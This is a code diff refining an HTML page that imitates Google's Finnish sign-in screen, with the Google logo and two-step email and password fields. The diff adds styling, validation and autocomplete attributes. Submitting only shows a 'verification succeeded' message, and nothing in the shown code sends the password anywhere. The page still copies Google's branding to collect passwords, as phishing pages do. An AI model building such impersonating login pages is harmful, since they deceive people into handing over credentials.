@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Kirjaudu sisään – Google-tilit</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
   <style>
     body {
       font-family: 'Roboto', sans-serif;
@@ -54,6 +54,14 @@
       border: 1px solid #dadce0;
       border-radius: 4px;
       font-size: 16px;
+      box-sizing: border-box;
+      transition: border-color 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    input.error {
+      border-color: #dc3545;
+      outline: none;
+      box-shadow: 0 0 5px #dc3545;
     }
 
     .button {
@@ -67,6 +75,10 @@
       cursor: pointer;
       margin-top: 10px;
       float: right;
+      transition: background-color 0.3s ease;
+    }
+    .button:hover {
+      background-color: #155ab6;
     }
 
     .create-account {
@@ -101,6 +113,7 @@
       border-radius: 4px;
       display: none;
       font-size: 14px;
+      text-align: left;
     }
 
     #error-message {
@@ -119,7 +132,7 @@
 <body>
   <div class="login-container">
     <div class="logo">
-      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" />
     </div>
     <h1>Kirjaudu sisään</h1>
     <p class="subtitle" id="step-text">Jatkaaksesi käytä Google-tiliäsi</p>
@@ -127,7 +140,14 @@
     <form id="login-form">
       <!-- Vaihe 1: Sähköposti -->
       <div id="email-step">
-        <input type="email" id="email" name="email" placeholder="Sähköpostiosoite tai puhelinnumero" required />
+        <input
+          type="email"
+          id="email"
+          name="email"
+          placeholder="Sähköpostiosoite tai puhelinnumero"
+          required
+          autocomplete="username"
+        />
         <button type="button" class="button" onclick="goToPassword()">Seuraava</button>
         <div id="error-message">Sähköpostiosoitteen tulee sisältää @-merkki</div>
       </div>
@@ -135,7 +155,14 @@
       <!-- Vaihe 2: Salasana -->
       <div id="password-step" class="hidden">
         <p class="text-left" id="email-display"></p>
-        <input type="password" id="password" name="password" placeholder="Syötä salasana" required />
+        <input
+          type="password"
+          id="password"
+          name="password"
+          placeholder="Syötä salasana"
+          required
+          autocomplete="current-password"
+        />
         <button type="submit" class="button">Kirjaudu</button>
       </div>
 
@@ -145,7 +172,6 @@
       </div>
     </form>
 
-    <!-- ✅ Varmenne onnistui -viesti -->
     <div id="confirmation-message">Varmenne onnistui</div>
   </div>
 
@@ -155,12 +181,13 @@
       const email = emailInput.value.trim();
       const errorMsg = document.getElementById('error-message');
 
-      // Piilota vanha virhe
+      // Piilota virheilmoitus ja poista virhetyyli
       errorMsg.style.display = 'none';
+      emailInput.classList.remove('error');
 
-      // Tarkistus
       if (email === '' || !email.includes('@')) {
         errorMsg.style.display = 'block';
+        emailInput.classList.add('error');
         return;
       }
 
@@ -171,24 +198,33 @@
       document.getElementById('email-display').textContent = email;
     }
 
-    document.getElementById('login-form').addEventListener('submit', function(e) {
+    document.getElementById('login-form').addEventListener('submit', function (e) {
       e.preventDefault();
 
-      const password = document.getElementById('password').value;
+      const passwordInput = document.getElementById('password');
+      const password = passwordInput.value.trim();
       const confirmation = document.getElementById('confirmation-message');
 
-      if (password.trim() === '') {
+      if (password === '') {
         alert('Syötä salasana');
+        passwordInput.focus();
         return;
       }
 
-      // Näytä varmenneviesti
+      // Näytä varmenneviesti ja piilota virhe (jos oli)
       confirmation.style.display = 'block';
+
+      // Halutessa voit piilottaa lomakkeen tai tyhjentää kentät tässä
+      // Esim: this.reset();
+
+      // Voit halutessasi poistaa salasana-vaiheen näkymästä:
+      // document.getElementById('password-step').classList.add('hidden');
     });
 
-    // Piilota virheilmoitus kun kirjoitetaan
+    // Kun käyttäjä kirjoittaa sähköpostikenttään, piilotetaan virheilmoitus ja poistetaan punainen reunus
     document.getElementById('email').addEventListener('input', function () {
       document.getElementById('error-message').style.display = 'none';
+      this.classList.remove('error');
     });
   </script>
 </body>
